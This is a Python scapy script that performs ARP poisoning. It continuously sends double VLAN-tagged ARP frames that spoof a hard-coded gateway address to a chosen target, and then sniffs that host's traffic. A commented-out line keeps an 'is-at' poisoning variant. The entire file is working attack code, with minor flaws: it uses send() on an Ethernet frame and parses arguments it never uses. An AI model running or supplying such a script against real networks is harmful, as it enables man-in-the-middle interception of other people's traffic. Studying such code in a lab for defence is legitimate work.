import argparse
from scapy.all import *
from scapy.all import Ether, ARP
parser = argparse.ArgumentParser(description="Perform ARP poisoning on a target")
parser.add_argument("ip_src", help="Enter the ip address of the source machine")
parser.add_argument("mac_src", help="Enter the mac address of the source machine")
parser.add_argument("ip_target", help="Enter the ip address of the target machine")
parser.add_argument("mac_target", help="Enter the mac address of the target machine")

args = parser.parse_args()

def process_packet(packet):
    print(packet.summary())
conf.use_pcap = True
gateway = "172.25.0.1"
send( Ether(dst=args.mac_target)/Dot1Q(vlan=1)/Dot1Q(vlan=2)/ARP(op="who-has", psrc=gateway, pdst=args.ip_target),inter=RandNum(10,40), loop=1 )
#sendp(Ether(dst=args.mac_target)/ARP(op="is-at", psrc=gateway, pdst=args.ip_target), inter=RandNum(10,40), loop=1 )
capture = sniff(filter=f"host 172.25.0.2", prn=process_packet)